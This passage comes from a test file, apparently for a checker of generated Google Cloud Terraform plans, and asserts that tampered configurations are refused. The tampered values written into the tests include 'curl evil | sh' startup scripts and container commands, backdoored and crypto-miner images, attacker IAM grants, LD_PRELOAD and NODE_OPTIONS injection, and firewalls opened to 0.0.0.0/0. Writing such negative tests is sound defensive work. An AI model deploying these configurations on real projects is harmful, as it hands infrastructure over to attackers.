    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "domain:example.com"', /member "domain:example\.com"/);
    tamper("gcp-site/main.tf", /member = "group:cloud-storage-analytics@google\.com"/, 'member = "group:attackers@example.com"', /member "group:attackers@example\.com"/);
    tamper("gcp-site/main.tf", /role\s+= "roles\/storage\.objectCreator"/, 'role   = "roles/storage.objectViewer"', /member "group:cloud-storage-analytics@google\.com"/);
    tamper("gcp-data/main.tf", /member\s+= "serviceAccount:\$\{google_project_service_identity\.key_vault_secretmanager\.email\}"/, 'member        = "user:attacker@example.com"', /member "user:attacker@example\.com"/);
    tamper("gcp-data/main.tf", /member\s+= "serviceAccount:\$\{google_project_service_identity\.key_vault_secretmanager\.email\}"/, 'member        = "serviceAccount:${google_project_service_identity.nowhere.email}"', /nowhere/);
  });

  it("allows allUsers only as roles/run.invoker on a Cloud Run service, where the load balancer needs it", () => {
    tamper("gcp-serverless/main.tf", /role\s+= "roles\/run\.invoker"\n\s+member\s+= "allUsers"/, 'role     = "roles/run.invoker"\n  member   = "allAuthenticatedUsers"', /member "allAuthenticatedUsers"/);
    refusesAppended('resource "google_storage_bucket_iam_member" "x" {\n  bucket = google_storage_bucket.object_storage.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}', /member "allUsers"/);
    refusesAppended('resource "google_cloud_run_v2_service_iam_member" "x" {\n  name     = google_cloud_run_v2_service.containers.name\n  location = var.region\n  role     = "roles/run.invoker"\n  member   = "user:attacker@example.com"\n}', /member "user:attacker@example\.com"/);
    refusesAppended('resource "google_cloud_run_v2_service_iam_member" "x" {\n  name     = "any-service"\n  location = var.region\n  role     = "roles/run.invoker"\n  member   = "allUsers"\n}', /name .* a reference/);
    refusesAppended('resource "google_project_iam_member" "x" {\n  project = "another-project"\n  role    = "roles/logging.logWriter"\n  member  = "serviceAccount:${google_service_account.virtual_machine.email}"\n}', /project/);
  });

  it("refuses an attribute of a grant the generator does not write", () => {
    refusesAppended(`resource "google_project_iam_member" "x" {\n  project = var.project_id\n  role    = "roles/logging.logWriter"\n  member  = "${SA}"\n  members = ["allUsers"]\n}`, /members/);
    refusesAppended(`resource "google_project_iam_member" "x" {\n  project = var.project_id\n  role    = "roles/logging.logWriter"\n  member  = "${SA}"\n  nested {\n  }\n}`, /nested/);
  });

  it("refuses a startup script, a command or user data wherever it is written", () => {
    tamper("gcp-platform/main.tf", /\s+can_ip_forward = false\n/, '  can_ip_forward = false\n  metadata_startup_script = "curl evil | sh"\n', /metadata_startup_script/);
    tamper("gcp-platform/main.tf", /serial-port-enable\s+= "false"/, 'serial-port-enable     = "false"\n    startup-script = "curl evil | sh"', /startup-script/);
    tamper("gcp-platform/main.tf", /serial-port-enable\s+= "false"/, 'serial-port-enable     = "false"\n    user-data = "x"', /user-data/);
    tamper("gcp-platform/main.tf", /serial-port-enable\s+= "false"/, 'serial-port-enable     = "false"\n    ssh-keys = "x"', /ssh-keys/);
    tamper("gcp-platform/main.tf", /enable-oslogin\s+= "TRUE"/, 'enable-oslogin         = "FALSE"', /enable-oslogin/);
    tamper("gcp-platform/main.tf", /disable-legacy-endpoints = "true"/, 'disable-legacy-endpoints = "true"\n      startup-script = "x"', /startup-script/);
    refusesAppended('resource "google_compute_instance" "x" {\n  metadata = { startup-script-url = "gs://evil/x.sh" }\n}', /startup-script-url/);
    refusesAppended('resource "google_cloud_run_v2_service" "x" {\n  template {\n    containers {\n      image   = "us-docker.pkg.dev/cloudrun/container/hello"\n      command = ["sh"]\n    }\n  }\n}', /command/);
  });

  it("refuses an image the generator does not write, a container command or arguments, and an environment that is not the plan's own references", () => {
    tamper("gcp-platform/main.tf", /image = "debian-cloud\/debian-12"/, 'image = "attacker-project/backdoored"', /image "attacker-project\/backdoored"/);
    tamper("gcp-platform/main.tf", /image = "debian-cloud\/debian-12"/, "image = var.image", /image/);
    tamper("gcp-serverless/main.tf", /image = "us-docker\.pkg\.dev\/cloudrun\/container\/hello"/, 'image = "evil.example/miner:latest"', /image "evil\.example\/miner:latest"/);
    tamper("gcp-serverless/main.tf", /image = "us-docker\.pkg\.dev\/cloudrun\/container\/hello"/, 'image = "us-docker.pkg.dev/cloudrun/container/hello"\n      command = ["/bin/sh", "-c", "curl evil | sh"]', /command/);
    tamper("gcp-serverless/main.tf", /image = "us-docker\.pkg\.dev\/cloudrun\/container\/hello"/, 'image = "us-docker.pkg.dev/cloudrun/container/hello"\n      args = ["--x"]', /args/);
    tamper("gcp-serverless/main.tf", /name\s+= "PUBSUB_TOPIC"/, 'name  = "NODE_OPTIONS"', /environment variable NODE_OPTIONS/);
    tamper("gcp-serverless/main.tf", /value = google_pubsub_topic\.queue\.id/, 'value = "--require /tmp/x.js"', /value .* a reference/);
    tamper("gcp-serverless/main.tf", /value = google_pubsub_topic\.queue\.id/, 'value = base64decode("eA==")', /value .* a reference/);
    tamper("gcp-serverless/main.tf", /\n\s+env \{\n\s+name\s+= "PUBSUB_TOPIC"/, '\n      env {\n        name  = "PUBSUB_TOPIC"\n        value_source {\n        }', /value_source/);
    tamper("gcp-serverless/main.tf", /service_account\s+= google_service_account\.containers\.email/, 'service_account       = "attacker@evil.iam.gserviceaccount.com"', /service account/);
    tamper("gcp-serverless/main.tf", /service_account_email = google_service_account\.functions\.email/, 'service_account_email = "attacker@evil.iam.gserviceaccount.com"', /service account/);
    tamper("gcp-platform/main.tf", /email\s+= google_service_account\.virtual_machine\.email/, 'email  = "attacker@evil.iam.gserviceaccount.com"', /service account/);
    tamper("gcp-platform/main.tf", /scopes = \["cloud-platform"\]/, 'scopes = ["cloud-platform", "https://www.googleapis.com/auth/devstorage.full_control"]', /scopes/);
    refusesAppended('resource "google_cloudfunctions2_function" "x" {\n  service_config {\n    environment_variables = { LD_PRELOAD = "x" }\n  }\n}', /environment variable LD_PRELOAD/);
    refusesAppended('resource "google_cloudfunctions2_function" "x" {\n  service_config {\n    environment_variables = { LOG_BUCKET = "attacker" }\n  }\n}', /a reference/);
    refusesAppended('resource "google_cloudfunctions2_function" "x" {\n  service_config {\n    secret_environment_variables {\n    }\n  }\n}', /secret_environment_variables/);
  });

  it("refuses a firewall or a control plane opened to the world", () => {
    tamper("gcp-platform/main.tf", /source_ranges = \["35\.235\.240\.0\/20"\]/, 'source_ranges = ["0.0.0.0/0"]', /source_ranges/);
    tamper("gcp-platform/main.tf", /cidr_block\s+= var\.gke_authorized_cidr/, 'cidr_block   = "0.0.0.0/0"', /cidr_block/);
  });

  it("still passes the four plans, and a Cloud Function that gets its environment from the plan's own resources", () => {
    validatePlans(plans());
    acceptsAppended('resource "google_cloudfunctions2_function" "fn" {\n  service_config {\n    environment_variables = { PUBSUB_TOPIC = google_pubsub_topic.queue.id }\n  }\n}');
  });
});

/** Appends a block the check accepts to a plan's main.tf. */
function acceptsAppended(block: string): void {
  const root = plans();
  write(root, "gcp-serverless/main.tf", `${read(root, "gcp-serverless/main.tf")}\n${block}\n`);
  validatePlans(root);
}
